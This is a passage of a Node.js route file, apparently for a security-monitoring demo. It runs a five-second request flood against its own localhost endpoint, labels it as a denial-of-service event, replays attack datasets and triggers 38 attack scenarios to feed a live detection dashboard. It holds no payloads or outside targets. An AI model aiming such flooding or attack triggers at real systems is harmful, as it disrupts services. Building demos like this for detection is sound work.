// Hard-locked strictly to http://127.0.0.1:3002/allOrders
// ==========================================
router.post("/tools/loadtest", async (req, res) => {
  // Hardcoded local target & fixed short duration — cannot be user configured
  const TARGET_URL = `http://127.0.0.1:${process.env.PORT || 3002}/allOrders`;
  const DURATION_SECONDS = 5;
  const CONCURRENCY = 15;

  const t0 = Date.now();
  const latencySamples = [];
  let totalRequests = 0;
  let errorCount = 0;

  // Run high-speed concurrent batch loop for 5 seconds
  const deadline = Date.now() + DURATION_SECONDS * 1000;

  while (Date.now() < deadline) {
    const batchPromises = [];
    for (let i = 0; i < CONCURRENCY; i++) {
      const reqStart = Date.now();
      batchPromises.push(
        sendLocalRequest({ path: "/allOrders", method: "GET" }).then((resp) => {
          const lat = Date.now() - reqStart;
          latencySamples.push(lat);
          totalRequests++;
          if (resp.statusCode >= 400) errorCount++;
        })
      );
    }
    await Promise.all(batchPromises);
    await new Promise((r) => setTimeout(r, 60));
  }

  const elapsedMs = Date.now() - t0;
  const avgLatency = Math.round(
    latencySamples.reduce((a, b) => a + b, 0) / (latencySamples.length || 1)
  );
  const p95Latency = latencySamples.sort((a, b) => a - b)[
    Math.floor(latencySamples.length * 0.95)
  ] || avgLatency;
  const rps = Math.round((totalRequests / (elapsedMs / 1000)) * 10) / 10;

  // Broadcast real load test telemetry to SSE feed
  const loadTelemetry = {
    timestamp: new Date().toISOString(),
    ip: "127.0.0.1",
    endpoint: "/allOrders (Load Test Flood)",
    method: "GET",
    category: "dos",
    layer: "network",
    source: "k6-load-benchmark",
    dataset: "Local Benchmark Engine",
    payload: {
      body: {
        benchmark_target: TARGET_URL,
        concurrency: CONCURRENCY,
        total_requests: totalRequests,
        avg_latency_ms: avgLatency,
        p95_latency_ms: p95Latency,
        rps: rps,
      },
    },
    details: {
      dos_type: "HTTP_GET_CONNECTION_EXHAUSTION",
      latency_degradation_ms: `${avgLatency}ms (Peak: ${p95Latency}ms)`,
      aggregate_rps: rps,
    },
  };
  broadcastLogEvent(loadTelemetry);

  res.json({
    success: true,
    tool: "k6 / Autocannon High-Concurrency Load Tester",
    target: TARGET_URL,
    hardcodedConstraints: "Hard-locked to 127.0.0.1:3002, 5-second capped test",
    totalRequests,
    durationSeconds: Math.round(elapsedMs / 1000),
    avgLatencyMs: avgLatency,
    p95LatencyMs: p95Latency,
    requestsPerSecond: rps,
    errorCount,
    latencyTimeline: latencySamples.slice(0, 30),
  });
});

// ==========================================
// 6. POST /demo/trigger/replay/:category (GROUP C STAGED / DATASET REPLAY)
// ==========================================
router.post("/trigger/replay/:category", (req, res) => {
  const { category } = req.params;
  const meta = ATTACK_METADATA[category];

  if (!meta || meta.phase !== "replay") {
    return res.status(400).json({ error: `Category '${category}' is not a dataset-replay attack.` });
  }

  const scriptPath = path.join(__dirname, "dataset-replay", "import.py");
  const pyArgs = [scriptPath, "--mode", "live", "--category", category, "--speed", "240", "--limit", "5"];

  const pyProcess = spawn("python", pyArgs, { cwd: __dirname });
  let stdoutData = "";
  let stderrData = "";

  pyProcess.stdout.on("data", (data) => {
    stdoutData += data.toString();
  });

  pyProcess.stderr.on("data", (data) => {
    stderrData += data.toString();
  });

  pyProcess.on("close", (code) => {
    // Also emit synthetic telemetry into the live SSE feed immediately for the demo
    const simulatedDoc = {
      timestamp: new Date().toISOString(),
      ip: category.includes("iot") ? "192.168.1.105" : "198.51.100.45",
      endpoint: meta.endpoint || "/network/flow",
      method: "DATA",
      category: category,
      layer: meta.layer,
      source: "dataset-replay",
      dataset: meta.dataset,
      payload: {
        body: {
          simulated_burst: true,
          replayed_records: 5,
          dataset_origin: meta.dataset,
        },
      },
      details: {
        dataset_origin: meta.dataset,
        layer: meta.layer,
        status: "REPLAY_COMPLETED",
      },
    };
    broadcastLogEvent(simulatedDoc);

    res.json({
      success: code === 0,
      category,
      phase: "replay",
      rowsReplayed: 5,
      output: stdoutData.split("\n").filter((l) => l.includes("[LIVE DRIP]")),
      error: code !== 0 ? stderrData : null,
    });
  });
});

// ==========================================
// 7. POST /demo/trigger/all
// ==========================================
router.post("/trigger/all", async (req, res) => {
  const categories = Object.keys(ATTACK_METADATA);

  // Return immediate acknowledgement
  res.json({
    success: true,
    message: "Started automated execution of all 38 MAD-PS attack scenarios.",
    totalAttacks: categories.length,
  });

  // Execute in background with staggered delays
  (async () => {
    for (let i = 0; i < categories.length; i++) {
      const cat = categories[i];
      const meta = ATTACK_METADATA[cat];

      try {
        if (meta.phase === "replay") {
          const simulatedDoc = {
            timestamp: new Date().toISOString(),
            ip: cat.includes("iot") ? "192.168.1.105" : "198.51.100.45",
            endpoint: meta.endpoint,
            method: "DATA",
            category: cat,
            layer: meta.layer,
            source: "dataset-replay",
            dataset: meta.dataset,
            payload: { body: { campaign_execution: "Fire All 38", batch_index: i + 1 } },
            details: { dataset: meta.dataset, layer: meta.layer },
          };
          broadcastLogEvent(simulatedDoc);
        } else {
          await fetch(`http://127.0.0.1:${process.env.PORT || 3002}/demo/trigger/app/${cat}`, {
            method: "POST",
          }).catch(() => {});
        }
      } catch (e) {}

      // Short delay between attacks for smooth live feed rendering
      await new Promise((resolve) => setTimeout(resolve, 250));
    }
  })();
});

module.exports = {
  demoRouter: router,
  logEmitter,
  ATTACK_METADATA,
  broadcastLogEvent,
};
